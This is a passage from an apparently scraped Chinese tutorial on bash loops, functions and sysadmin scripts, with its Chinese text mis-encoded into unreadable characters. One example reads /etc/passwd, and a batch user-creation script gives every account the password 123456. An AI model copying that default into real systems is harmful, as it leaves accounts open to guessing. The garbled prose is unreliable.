<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-built_in">sum</span>=0
<span class="hljs-keyword">for</span> (( i=<span class="hljs-number">1</span>; i&lt;=<span class="hljs-number">100</span>; i++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">sum</span>=$((sum + i))  <span class="hljs-comment"># æ•°å€¼è®¡ç®—ï¼ˆåŒæ‹¬å·ï¼‰</span>
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"1-100çš„å’Œï¼š<span class="hljs-variable">$sum</span>"</span>  <span class="hljs-comment"># è¾“å‡º5050</span>
</code></pre>
<h3 data-id="heading-24">2. whileå¾ªç¯ï¼ˆæ¡ä»¶æ»¡è¶³å°±å¾ªç¯ï¼‰</h3>
<h4 data-id="heading-25">ï¼ˆ1ï¼‰åŸºç¡€è¯­æ³•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">while</span> [ æ¡ä»¶è¡¨è¾¾å¼ ]; <span class="hljs-keyword">do</span>
    æ‰§è¡Œçš„å‘½ä»¤
<span class="hljs-keyword">done</span>
</code></pre>
<p>å®æˆ˜ç¤ºä¾‹1ï¼ˆå¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># è¯»å–/etc/passwdçš„æ¯ä¸€è¡Œï¼ˆé€è¡Œå¤„ç†ï¼‰</span>
file=<span class="hljs-string">"/etc/passwd"</span>
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># æå–ç”¨æˆ·åï¼ˆç¬¬ä¸€åˆ—ï¼Œ:åˆ†éš”ï¼‰</span>
    username=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">cut</span> -d: -f1)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"ç”¨æˆ·åï¼š<span class="hljs-variable">$username</span>"</span>
<span class="hljs-keyword">done</span> &lt; <span class="hljs-variable">$file</span>  <span class="hljs-comment"># &lt; è¡¨ç¤ºä»æ–‡ä»¶è¯»å–å†…å®¹</span>
</code></pre>
<p>å®æˆ˜ç¤ºä¾‹2ï¼ˆæ— é™å¾ªç¯+æ‰‹åŠ¨ç»ˆæ­¢ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># æ¯éš”5ç§’æ£€æŸ¥nginxæœåŠ¡æ˜¯å¦è¿è¡Œ</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>  <span class="hljs-comment"># trueè¡¨ç¤ºæ— é™å¾ªç¯</span>
    <span class="hljs-keyword">if</span> [ $(ps -ef | grep nginx | grep -v grep | <span class="hljs-built_in">wc</span> -l) -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"nginxå·²åœæ­¢ï¼Œæ­£åœ¨é‡å¯..."</span>
        systemctl start nginx
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"nginxè¿è¡Œæ­£å¸¸ï¼ˆ<span class="hljs-subst">$(date)</span>ï¼‰"</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">sleep</span> 5  <span class="hljs-comment"># ä¼‘çœ 5ç§’</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># ç»ˆæ­¢æ–¹å¼ï¼šCtrl+C</span>
</code></pre>
<h3 data-id="heading-26">3. å¾ªç¯æ§åˆ¶ï¼ˆbreak/continueï¼‰</h3>
<ul>
<li><code>break</code>ï¼šç»ˆæ­¢æ•´ä¸ªå¾ªç¯ï¼ˆè·³å‡ºå¾ªç¯ï¼‰ï¼›</li>
<li><code>continue</code>ï¼šè·³è¿‡å½“å‰å¾ªç¯ï¼Œæ‰§è¡Œä¸‹ä¸€æ¬¡å¾ªç¯ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼ˆéå†1-10ï¼Œé‡åˆ°5ç»ˆæ­¢å¾ªç¯ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$i</span> -eq 5 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">break</span>  <span class="hljs-comment"># ç»ˆæ­¢å¾ªç¯</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å½“å‰æ•°å­—ï¼š<span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-comment"># è¾“å‡º1-4</span>
</code></pre>
<p>ç¤ºä¾‹ï¼ˆéå†1-10ï¼Œè·³è¿‡5ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$i</span> -eq 5 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">continue</span>  <span class="hljs-comment"># è·³è¿‡5ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å½“å‰æ•°å­—ï¼š<span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-comment"># è¾“å‡º1-4ã€6-10</span>
</code></pre>
<h2 data-id="heading-27">äº”ã€å‡½æ•°ï¼šè®©è„šæœ¬â€œæ¨¡å—åŒ–â€</h2>
<p>å‡½æ•°æ˜¯æŠŠé‡å¤çš„ä»£ç å—å°è£…æˆâ€œå¯è°ƒç”¨çš„å‘½ä»¤â€ï¼Œå‡å°‘è„šæœ¬å†—ä½™ï¼Œæ–¹ä¾¿ç»´æŠ¤â€”â€”æ¯”å¦‚æŠŠâ€œå¤‡ä»½æ•°æ®åº“â€â€œæ£€æŸ¥æœåŠ¡çŠ¶æ€â€å°è£…æˆå‡½æ•°ï¼ŒæŒ‰éœ€è°ƒç”¨ã€‚</p>
<h3 data-id="heading-28">1. å‡½æ•°å®šä¹‰ä¸è°ƒç”¨</h3>
<h4 data-id="heading-29">ï¼ˆ1ï¼‰åŸºç¡€è¯­æ³•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®šä¹‰å‡½æ•°</span>
å‡½æ•°å() {
    ä»£ç å—
    <span class="hljs-built_in">return</span> æ•°å€¼  <span class="hljs-comment"># è¿”å›å€¼ï¼ˆå¯é€‰ï¼Œé»˜è®¤è¿”å›æœ€åä¸€æ¡å‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€ï¼‰</span>
}

<span class="hljs-comment"># è°ƒç”¨å‡½æ•°</span>
å‡½æ•°å å‚æ•°1 å‚æ•°2
</code></pre>
<h4 data-id="heading-30">ï¼ˆ2ï¼‰å®æˆ˜ç¤ºä¾‹ï¼ˆå°è£…å¤‡ä»½å‡½æ•°ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å®šä¹‰å¤‡ä»½å‡½æ•°ï¼ˆå‚æ•°1ï¼šå¤‡ä»½ç›®å½•ï¼Œå‚æ•°2ï¼šå¤‡ä»½æ–‡ä»¶åï¼‰</span>
<span class="hljs-function"><span class="hljs-title">backup_dir</span></span>() {
    <span class="hljs-built_in">local</span> src_dir=<span class="hljs-variable">$1</span>  <span class="hljs-comment"># å±€éƒ¨å˜é‡ï¼ˆä»…å‡½æ•°å†…æœ‰æ•ˆï¼‰</span>
    <span class="hljs-built_in">local</span> backup_file=<span class="hljs-variable">$2</span>
    <span class="hljs-keyword">if</span> [ -d <span class="hljs-string">"<span class="hljs-variable">$src_dir</span>"</span> ]; <span class="hljs-keyword">then</span>
        tar -zcf /tmp/<span class="hljs-variable">$backup_file</span>.tar.gz <span class="hljs-variable">$src_dir</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"å¤‡ä»½æˆåŠŸï¼š/tmp/<span class="hljs-variable">$backup_file</span>.tar.gz"</span>
        <span class="hljs-built_in">return</span> 0  <span class="hljs-comment"># æˆåŠŸè¿”å›0</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"é”™è¯¯ï¼šç›®å½•<span class="hljs-variable">$src_dir</span>ä¸å­˜åœ¨ï¼"</span>
        <span class="hljs-built_in">return</span> 1  <span class="hljs-comment"># å¤±è´¥è¿”å›1</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># è°ƒç”¨å‡½æ•°ï¼ˆå¤‡ä»½/var/logç›®å½•ï¼‰</span>
backup_dir /var/log log_backup_2025

<span class="hljs-comment"># è°ƒç”¨å‡½æ•°ï¼ˆå¤‡ä»½/homeç›®å½•ï¼‰</span>
backup_dir /home home_backup_2025
</code></pre>
<h3 data-id="heading-31">2. å‡½æ•°å‚æ•°ä¸è¿”å›å€¼</h3>
<ul>
<li>å‡½æ•°å‚æ•°ï¼šè°ƒç”¨æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œç”¨<code>$1</code>ã€<code>$2</code>è·å–ï¼ˆä¸è„šæœ¬ä½ç½®å‚æ•°ç”¨æ³•ä¸€è‡´ï¼‰ï¼›</li>
<li>å‡½æ•°è¿”å›å€¼ï¼š
<ul>
<li>ç”¨<code>return</code>è¿”å›ï¼ˆä»…èƒ½è¿”å›0-255çš„æ•´æ•°ï¼Œ0=æˆåŠŸï¼Œé0=å¤±è´¥ï¼‰ï¼›</li>
<li>è‹¥éœ€è¿”å›å­—ç¬¦ä¸²/æ•°å€¼ï¼Œç”¨<code>echo</code>è¾“å‡ºï¼Œè°ƒç”¨æ—¶ç”¨<code>å˜é‡=$(å‡½æ•°å)</code>æ¥æ”¶ã€‚</li>
</ul>
</li>
</ul>
<p>ç¤ºä¾‹ï¼ˆè¿”å›æ•°å€¼è®¡ç®—ç»“æœï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å®šä¹‰åŠ æ³•å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-title">add</span></span>() {
    <span class="hljs-built_in">local</span> a=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> b=<span class="hljs-variable">$2</span>
    <span class="hljs-built_in">echo</span> $((a + b))  <span class="hljs-comment"># ç”¨echoè¿”å›ç»“æœ</span>
}

<span class="hljs-comment"># è°ƒç”¨å‡½æ•°ï¼Œæ¥æ”¶è¿”å›å€¼</span>
result=$(add 10 20)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"10+20=<span class="hljs-variable">$result</span>"</span>  <span class="hljs-comment"># è¾“å‡º30</span>
</code></pre>
<h3 data-id="heading-32">3. å‡½æ•°å®æˆ˜ï¼ˆè¿ç»´å¸¸ç”¨ï¼‰</h3>
<p>å°è£…â€œæ£€æŸ¥ç«¯å£æ˜¯å¦å¼€æ”¾â€å‡½æ•°ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å®šä¹‰æ£€æŸ¥ç«¯å£å‡½æ•°ï¼ˆå‚æ•°1ï¼šIPï¼Œå‚æ•°2ï¼šç«¯å£ï¼‰</span>
<span class="hljs-function"><span class="hljs-title">check_port</span></span>() {
    <span class="hljs-built_in">local</span> ip=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> port=<span class="hljs-variable">$2</span>
    <span class="hljs-comment"># ä½¿ç”¨ncå‘½ä»¤æ£€æŸ¥ç«¯å£ï¼ˆéœ€å®‰è£…ncï¼šyum install -y ncï¼‰</span>
    nc -z -w 2 <span class="hljs-variable">$ip</span> <span class="hljs-variable">$port</span> &gt; /dev/null 2&gt;&amp;1
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span> å¼€æ”¾"</span>
        <span class="hljs-built_in">return</span> 0
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span> å…³é—­"</span>
        <span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># æ‰¹é‡æ£€æŸ¥ç«¯å£</span>
check_port 192.168.1.100 80
check_port 192.168.1.100 3306
check_port 192.168.1.100 6379
</code></pre>
<h2 data-id="heading-33">å…­ã€Shellè„šæœ¬å®æˆ˜æ¡ˆä¾‹ï¼ˆç»¼åˆè¿ç”¨ï¼‰</h2>
<h3 data-id="heading-34">æ¡ˆä¾‹1ï¼šæ‰¹é‡åˆ›å»ºç”¨æˆ·å¹¶è®¾ç½®å¯†ç </h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># è„šæœ¬åï¼šcreate_users.sh</span>
<span class="hljs-comment"># åŠŸèƒ½ï¼šæ‰¹é‡åˆ›å»ºç”¨æˆ·ï¼Œå¯†ç ç»Ÿä¸€ä¸º123456ï¼ˆç”Ÿäº§ç¯å¢ƒéœ€æ”¹ä¸ºéšæœºå¯†ç ï¼‰</span>

<span class="hljs-comment"># å®šä¹‰ç”¨æˆ·åˆ—è¡¨</span>
<span class="hljs-built_in">users</span>=<span class="hljs-string">"user1 user2 user3 user4"</span>

<span class="hljs-comment"># å¾ªç¯åˆ›å»ºç”¨æˆ·</span>
<span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> <span class="hljs-variable">$users</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²å­˜åœ¨</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-variable">$user</span> &gt; /dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$user</span>å·²å­˜åœ¨ï¼Œè·³è¿‡..."</span>
        <span class="hljs-built_in">continue</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-comment"># åˆ›å»ºç”¨æˆ·</span>
    useradd <span class="hljs-variable">$user</span>
    <span class="hljs-comment"># è®¾ç½®å¯†ç ï¼ˆecho "å¯†ç " | passwd --stdin ç”¨æˆ·åï¼‰</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"123456"</span> | passwd --stdin <span class="hljs-variable">$user</span> &gt; /dev/null 2&gt;&amp;1
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$user</span>åˆ›å»ºæˆåŠŸï¼Œå¯†ç ï¼š123456"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$user</span>åˆ›å»ºå¤±è´¥ï¼"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-35">æ¡ˆä¾‹2ï¼šæ—¥å¿—æ¸…ç†è„šæœ¬ï¼ˆä¿ç•™7å¤©å†…æ—¥å¿—ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># è„šæœ¬åï¼šclean_logs.sh</span>
<span class="hljs-comment"># åŠŸèƒ½ï¼šåˆ é™¤/tmpä¸‹7å¤©å‰çš„.logæ–‡ä»¶</span>

log_dir=<span class="hljs-string">"/tmp"</span>
<span class="hljs-comment"># éå†7å¤©å‰çš„.logæ–‡ä»¶</span>
find <span class="hljs-variable">$log_dir</span> -name <span class="hljs-string">"*.log"</span> -mtime +7 -<span class="hljs-built_in">type</span> f | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> log_file; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># åˆ é™¤æ–‡ä»¶</span>
    <span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$log_file</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å·²åˆ é™¤ï¼š<span class="hljs-variable">$log_file</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ—¥å¿—æ¸…ç†å®Œæˆï¼"</span>
</code></pre>
<h2 data-id="heading-36">ä¸ƒã€Shellè„šæœ¬é¿å‘æŒ‡å—ï¼ˆæ–°æ‰‹å¿…çœ‹ï¼‰</h2>
<ol>
<li><strong>è¯­æ³•é”™è¯¯</strong>ï¼š<code>if</code>çš„<code>[ ]</code>ä¸¤è¾¹åŠ ç©ºæ ¼ã€å˜é‡èµ‹å€¼ç­‰å·æ— ç©ºæ ¼ã€å¾ªç¯/å‡½æ•°ç»“å°¾çš„<code>done</code>/<code>fi</code>/<code>}</code>å¿…é¡»å†™ï¼›</li>
<li><strong>è·¯å¾„é—®é¢˜</strong>ï¼šè„šæœ¬ä¸­å°½é‡ç”¨ç»å¯¹è·¯å¾„ï¼ˆå¦‚<code>/tmp/test.log</code>ï¼‰ï¼Œé¿å…ç›¸å¯¹è·¯å¾„å¯¼è‡´æ‰§è¡Œå¤±è´¥ï¼›</li>
<li><strong>æƒé™é—®é¢˜</strong>ï¼šè„šæœ¬æ‰§è¡Œæ—¶éœ€æœ‰å¯¹åº”æƒé™ï¼ˆå¦‚åˆ›å»ºæ–‡ä»¶éœ€å†™æƒé™ï¼Œåˆ é™¤æ–‡ä»¶éœ€åˆ æƒé™ï¼‰ï¼›</li>
<li><strong>ç‰¹æ®Šå­—ç¬¦</strong>ï¼šå¤„ç†åŒ…å«ç©ºæ ¼çš„æ–‡ä»¶å/è·¯å¾„æ—¶ï¼Œç”¨åŒå¼•å·åŒ…è£¹ï¼ˆå¦‚<code>[ -f "$file" ]</code>ï¼‰ï¼›</li>
<li><strong>æ—¥å¿—è¾“å‡º</strong>ï¼šé‡è¦æ“ä½œæ·»åŠ æ—¥å¿—ï¼ˆå¦‚<code>echo "[$(date)] å¤‡ä»½å¤±è´¥" &gt;&gt; /tmp/backup.log</code>ï¼‰ï¼Œæ–¹ä¾¿æ’æŸ¥é—®é¢˜ï¼›</li>
<li><strong>æµ‹è¯•å…ˆè¡Œ</strong>ï¼šæ–°è„šæœ¬å…ˆåœ¨æµ‹è¯•ç¯å¢ƒè¿è¡Œï¼Œç”¨<code>bash -x è„šæœ¬å</code>è°ƒè¯•ï¼ˆæ˜¾ç¤ºæ‰§è¡Œè¿‡ç¨‹ï¼‰ã€‚</li>
</ol>
<h2 data-id="heading-37">æ€»ç»“</h2>
<p>Shellè„šæœ¬çš„æ ¸å¿ƒæ˜¯â€œæŠŠå¤æ‚æ“ä½œç®€å•åŒ–ã€é‡å¤æ“ä½œè‡ªåŠ¨åŒ–â€â€”â€”å˜é‡å­˜å‚¨æ•°æ®ï¼Œæ¡ä»¶åˆ¤æ–­å®ç°é€»è¾‘åˆ†æ”¯ï¼Œå¾ªç¯å¤„ç†æ‰¹é‡ä»»åŠ¡ï¼Œå‡½æ•°å°è£…å¤ç”¨ä»£ç ã€‚å­¦ä¹ æ—¶æ— éœ€æ­»è®°è¯­æ³•ï¼Œé‡ç‚¹æ˜¯â€œå¤šå†™å¤šç»ƒâ€ï¼šå…ˆä»ç®€å•è„šæœ¬ï¼ˆå¦‚æ‰¹é‡åˆ›å»ºæ–‡ä»¶ã€æ£€æŸ¥æœåŠ¡çŠ¶æ€ï¼‰å…¥æ‰‹ï¼Œå†é€æ­¥å®ç°å¤æ‚åŠŸèƒ½ï¼ˆå¦‚è‡ªåŠ¨åŒ–å¤‡ä»½ã€æ‰¹é‡éƒ¨ç½²ï¼‰ã€‚</p>
<p>æŒæ¡è¿™äº›åŸºç¡€è¯­æ³•åï¼Œå¯ç»“åˆè¿ç»´åœºæ™¯æ‰©å±•ï¼ˆå¦‚ç»“åˆcrontabå®šæ—¶æ‰§è¡Œè„šæœ¬ã€ç»“åˆSSHæ‰¹é‡ç®¡ç†æœåŠ¡å™¨ï¼‰ï¼ŒçœŸæ­£å®ç°â€œä¸€é”®è¿ç»´â€ï¼Œå¤§å¹…æå‡å·¥ä½œæ•ˆç‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€AI-7 å…¨æ ˆ-2 /Lesson16(2025-11-01)ã€‘æ„å»ºä¸€ä¸ªåŸºäº AIGC çš„ Logo ç”Ÿæˆ Botï¼šä»å‰ç«¯åˆ°åç«¯çš„å®Œæ•´æŠ€æœ¯æŒ‡å— ğŸ¨]]></title>    <link>https://juejin.cn/post/7576978338754756658</link>    <guid>https://juejin.cn/post/7576978338754756658</guid>    <pubDate>2025-11-27T06:28:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754756658" data-draft-id="7576929700842455049" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€AI-7 å…¨æ ˆ-2 /Lesson16(2025-11-01)ã€‘æ„å»ºä¸€ä¸ªåŸºäº AIGC çš„ Logo ç”Ÿæˆ Botï¼šä»å‰ç«¯åˆ°åç«¯çš„å®Œæ•´æŠ€æœ¯æŒ‡å— ğŸ¨"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-11-27T06:28:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jing_Rainbow"/> <meta itemprop="url" content="https://juejin.cn/user/1285809519198256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€AI-7 å…¨æ ˆ-2 /Lesson16(2025-11-01)ã€‘æ„å»ºä¸€ä¸ªåŸºäº AIGC çš„ Logo ç”Ÿæˆ Botï¼šä»å‰ç«¯åˆ°åç«¯çš„å®Œæ•´æŠ€æœ¯æŒ‡å— ğŸ¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1285809519198256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jing_Rainbow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:28:32.000Z" title="Thu Nov 27 2025 06:28:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ğŸ¨åœ¨å½“ä»Šè¿™ä¸ªäººå·¥æ™ºèƒ½ä¸å‰ç«¯å¼€å‘æ·±åº¦èåˆçš„æ—¶ä»£ï¼Œæ„å»ºä¸€ä¸ªèƒ½æ ¹æ®ç”¨æˆ·è¾“å…¥è‡ªåŠ¨ç”Ÿæˆ Logo çš„æ™ºèƒ½ Bot å·²ä¸å†æ˜¯é¥ä¸å¯åŠçš„æ¢¦æƒ³ã€‚æœ¬æ–‡<strong>é€å­—é€å¥ã€æ¯«æ— åˆ 